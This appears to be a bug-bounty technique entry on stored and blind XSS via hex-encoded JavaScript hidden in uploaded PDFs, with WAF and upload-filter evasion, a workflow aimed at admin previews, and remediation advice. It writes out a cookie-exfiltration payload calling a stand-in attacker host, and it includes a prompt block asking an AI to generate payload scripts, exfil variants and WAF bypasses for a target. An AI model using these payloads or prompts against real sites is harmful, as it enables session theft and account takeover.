---
id: "pdf-stored-xss-bypass"
title: "PDF-Based Stored & Blind XSS - Hex Encoding Bypass for WAFs & Upload Filters 2026"
type: "technique"
category: "web-application"
subcategory: "xss"
tags: ["pdf", "stored-xss", "blind-xss", "waf-bypass", "hex-encoding", "pdfjs", "cve-2024-4367", "file-upload"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["file-upload", "xss-bypass", "xss-waf-bypass", "xss-advanced-techniques"]
updated: "2026-05-04"
---

## Overview
PDF preview/rendering (PDF.js, Adobe, browser viewers) introduces a novel XSS surface. By embedding hex-encoded JavaScript in PDF objects (fonts, content streams, malformed references), attackers bypass WAFs, upload filters, and content scanners. Triggers on admin/support preview. Combines with file-upload for stored/blind XSS. Major payouts via token exfil.

## Core Technique: Hex-Encoded JS in PDF
1. Take payload: `alert(document.domain)` or `fetch('https://attacker.com/log?c='+document.cookie)`
2. Hex encode: `\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29`
3. Embed in minimal valid PDF:
   - Font object
   - Glyph stream
   - Malformed object ref
   - Content stream edge case
4. Upload as .pdf to any preview feature (documents, invoices, support tickets, profile pics if allowed).

**Why it bypasses**:
- WAFs scan for `<script>`, `alert(`, HTML tags → hex in PDF binary evades.
- Upload filters trust MIME or magic bytes (PDF starts with %PDF-).
- Renderer (PDF.js vulnerable to CVE-2024-4367 font handling) executes JS in viewer context.

## Stored vs Blind XSS Modes
- **Stored**: Payload persists; any viewer (admin, other users) triggers.
- **Blind**: Use exfil beacon instead of alert. Log cookies, URL, role, IP. Callback confirms execution.

## Practical Workflow
1. Identify upload + preview endpoints (Burp history search for "pdf", "document", "preview").
2. Generate malicious PDF (use hex editor or Python script with reportlab + embedded hex).
3. Upload as normal user.
4. Trigger: Preview as attacker first, then wait for victim (use Burp Collaborator or webhook).
5. Escalate: Replace alert with token exfil, role detection, redirect.

**PoC Payload Example (simplified)**:
```
%PDF-1.4
... (minimal structure with hex JS in /Font or stream)
```

## Bypass Variants & Analysis
- **WAF Bypass**: Hex + no obvious tags. Combine with double-encoding if needed.
- **Filter Bypass**: Prepend valid PDF magic, use .pdf extension.
- **CSP Interaction**: If page has loose CSP, easier; else chain with other gadgets.
- **Modern Renderers**: Post-CVE-2024-4367 patches still have edge cases in font/glyph parsing.

## Deep Dig Prompts
```
For target.com with file upload/preview features (list endpoints from recon), generate:
1. Python script to create hex-encoded PDF XSS payload targeting PDF.js or generic viewer.
2. 5 upload + preview test cases (support ticket, invoice upload, profile doc).
3. Blind XSS exfil variant with webhook callback.
4. Impact analysis: "Admin panel token theft leading to full ATO".
5. Detection bypass for common WAFs (Cloudflare, AWS WAF).
Include reproduction steps and report template section. Prioritize admin-visible previews.
```

## Remediation
- Server-side sanitization of PDFs (strip JS objects, use safe renderer).
- Serve uploads from isolated origin or with `Content-Disposition: attachment`.
- Disable client-side PDF preview for untrusted files; use server-side conversion to images.
- Implement strict magic byte + content validation beyond headers.

## References
- Orwa Godfather XSS payloads repo, CVE-2024-4367, 2026 Medium field guides, real bug bounty reports.
---
